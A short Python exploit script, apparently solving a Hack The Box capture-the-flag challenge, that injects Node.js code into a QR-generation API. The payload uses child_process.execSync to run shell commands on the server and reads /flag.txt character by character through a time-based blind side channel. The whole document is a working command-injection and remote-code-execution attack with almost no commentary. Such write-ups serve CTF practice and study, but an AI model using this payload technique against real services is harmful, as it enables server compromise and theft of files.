#!/usr/bin/python3

import requests
import json
import time
import string

# Variáveis necessárias para a execução do script (exeto proxy)
server="94.237.53.113"
port=39077
url=f"http://{server}:{port}"
auth_endpoint=f"{url}/api/auth/authenticate"
qr_endpoint=f"{url}/api/service/generate"
proxy = {"http": "http://127.0.0.1:8080"}
headers = {"Content-Type": "application/json"}
data = {"email": "test@hackthebox.com"}

# Função para obter o token
def Get_token():
    response = requests.post(auth_endpoint, headers=headers, proxies=proxy, data=json.dumps(data))
    token = response.json()["token"]
    return token

# Função para realizar o ataque de Time-Based Blind
def TimeBasedBlind(token):
    flag = 'HTB{'
    num = len(flag)
    carac = string.ascii_letters + string.digits + "{}_/+-$#!@&"
    c = 0

    print("\n[+] Starting blind time-based attack")

    while True:
        num = str(len(flag)+1)
        payload={ "text": "'}) + require('child_process').execSync('cat /flag.txt | head -c "+ num +" | tail -c 1 |  { read c; if [ \"$c\" = \""+carac[c]+"\" ]; then sleep 3; fi; }')//"}

        start_time = time.time()
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
        response = requests.post(qr_endpoint, headers=headers, proxies=proxy, data=json.dumps(payload))
        end_time = time.time()
        response_time = end_time - start_time

        if response_time > 3:
            flag += carac[c]
            print("[+] Flag: ", flag, end="\r")
            if carac[c] == "}":
                break
            c = 0
        else:
            c += 1

    if flag[-1] == "}":
        return flag
    return None

if __name__ == "__main__":
    token = Get_token()
    flag = TimeBasedBlind(token)
    if flag:
        print("\n[+] Flag found: ", flag, "\n")
    
    print("[+] Done!")